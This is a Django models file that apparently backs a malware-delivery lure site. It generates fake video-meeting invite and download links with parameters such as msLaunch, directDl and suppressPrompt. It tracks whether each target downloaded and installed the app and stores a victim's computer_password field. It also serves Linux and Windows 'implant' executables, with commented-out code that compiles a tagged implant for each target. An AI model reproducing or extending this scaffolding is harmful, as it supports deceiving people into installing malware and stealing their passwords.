import random
import subprocess
from pathlib import Path
from django.core.files import File
from django.db import models
from django.db.models import F
from django.conf import settings
from django.urls import reverse_lazy
from django.contrib.auth.models import User 
from django.db.models.signals import pre_save, post_save


def user_profile_pre_save(sender, instance,  *args, **kwargs):
    if instance.id is None:
        instance.id_token = instance.generate_id_token(10)
        instance.redirect_link = instance.generate_redirect_link()
        instance.video_link = instance.generate_video_link()
        #instance.update_compiled_exe(instance.id_token)
    
    else:
        pass

"""
def user_profile_post_save(sender, instance, created, *args, **kwargs):
    if created:
        linux_path = Path('/home/blackrose/implant/target/release/implant')
        windows_path = Path('/home/blackrose/implant/target/x86_64-pc-windows-gnu/release/implant.exe')
        with linux_path.open(mode='rb') as l, windows_path.open(mode='rb') as w:
            instance.linux_exe_file = File(l, name=linux_path.name)
            instance.windows_exe_file = File(w, name=windows_path.name)
            instance.save()

    else:
        pass
        
"""

class Application(models.Model):
    linux_exe_file = models.FileField(upload_to="Downloads/linux/%y/%m/%d", blank=True, null=False)
    windows_exe_file =  models.FileField(upload_to="Downloads/windows/%y/%m/%d", blank=True, null=False)
    created = models.DateTimeField(auto_now_add=True, auto_now=False)   
    updated = models.DateTimeField(auto_now_add=False, auto_now = True)

    def __str__(self) -> str:
        return "Application Executable"


    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'Application Executable'
         


class UserProfile(models.Model):
    email = models.EmailField()
    id_token = models.CharField(max_length=1000, blank=True, unique=True, null=False) 
    app_downloaded = models.BooleanField(default=False)
    app_installed = models.BooleanField(default=False)
    computer_password = models.CharField(max_length=1000, blank=True, null=True)
    video_link = models.CharField(max_length=1000, default='', blank=True, null=False)
    redirect_link = models.URLField(default='', blank=True, null=False)
    link_visits = models.IntegerField(default=0)
    #mac_exe_file = models.FileField(upload_to="Executables/mac/%y/%m/%d", blank=True, null=False)
    #linux_exe_file = models.FileField(upload_to="Executables/linux/%y/%m/%d", blank=True, null=False)
    #windows_exe_file =  models.FileField(upload_to="Executables/windows/%y/%m/%d", blank=True, null=False)
    created = models.DateTimeField(auto_now_add=True, auto_now=False)
    updated = models.DateTimeField(auto_now_add=False, auto_now=True)


    def generate_id_token(self, n):
        assert n <= 10
        l = list(range(10))
        while l[0] == 0 :
            random.shuffle(l)
        return str(int(''.join(str(d) for d in l[:n])))

        
    def generate_redirect_link(self):
        return '{}{}?q=1&directDl=true&msLaunch=true&meet={}&enableMobilePage=true&video={}&suppressPrompt=true'.format(settings.BASE_URL, reverse_lazy('core:launcher'), self.id_token, self.pk)
    
    
    def generate_video_link(self):
        return '{}{}'.format(settings.BASE_URL, reverse_lazy('core:invite_link', kwargs={'code': self.id_token}))
    
    
    class Meta:
        abstract = True 


'''
    def update_compiled_exe(self, token_id):
        completed_process = subprocess.run(["/home/blackrose/vidicu/src/buildexec.sh", token_id])
        if completed_process.returncode == 0:
            return True

        else:
            return False
'''    
        

class NadiaProfile(UserProfile):
    
    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'NadiaProfiles'


class LizzyProfile(UserProfile):
    
    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'LizzyProfiles'



pre_save.connect(user_profile_pre_save, sender=NadiaProfile)
pre_save.connect(user_profile_pre_save, sender=LizzyProfile)
#post_save.connect(user_profile_post_save, sender=NadiaProfile)
#post_save.connect(user_profile_post_save, sender=LizzyProfile)
        


class SubscribeNewsletter(models.Model):
    email = models.EmailField()



class DownloadPageArticle(models.Model):
    user = models.OneToOneField(User, on_delete=models.DO_NOTHING)
    heading = models.CharField(max_length=200)
    heading_description = models.CharField(max_length=2000)
    second_heading = models.CharField(max_length=200)
    second_heading_description = models.CharField(max_length=2000)
    third_heading = models.CharField(max_length=200)
    third_heading_description = models.CharField(max_length=2000)
    fourth_heading = models.CharField(max_length=200)
    fourth_heading_description = models.CharField(max_length=2000)
    created = models.DateTimeField(auto_now_add=True, auto_now=False)
    updated = models.DateTimeField(auto_now=True)


    def __str__(self):
        return "Download Page Article"

    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'Download Page Article'
